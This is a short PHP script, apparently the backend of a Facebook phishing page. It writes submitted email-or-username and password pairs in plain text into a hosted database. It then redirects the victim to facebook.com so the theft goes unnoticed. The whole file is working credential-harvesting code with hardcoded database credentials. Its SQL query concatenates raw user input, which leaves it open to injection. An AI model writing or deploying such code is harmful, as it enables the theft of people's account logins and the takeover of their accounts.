<?php 

//Connection
$conn = mysqli_connect('localhost','id5769512_face','azsxdcfv');
$db = mysqli_select_db($conn,'id5769512_f4c3');

if (isset($_POST['submit'])) {
	$mailorname = $_POST['mailorname'];
	$password = $_POST['password'];

	$sql = "INSERT INTO accounts (mailorname,password) VALUES ('$mailorname','$password')"  ;
	$result = mysqli_query($conn,$sql);

	if ($result) {
		header('location: https://www.facebook.com');
	}else{
		header('location: https://www.twitter.com');
	}
}



 ?>